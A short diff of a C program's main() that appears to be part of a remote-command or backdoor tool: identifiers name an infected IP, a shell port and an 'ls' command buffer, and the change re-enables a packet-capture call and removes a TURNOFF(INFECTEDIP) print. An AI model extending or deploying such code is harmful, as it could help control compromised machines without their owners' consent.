@@ -48,8 +48,7 @@ int main(int argc, char **argv){
     unsigned short dport = SHPORT;
     unsigned char data[BUFSIZE] = "ls";
 	
-    printf("%s", TURNOFF(INFECTEDIP));
-   // Packetcapture();
+    Packetcapture();
 
     return 0;
 }
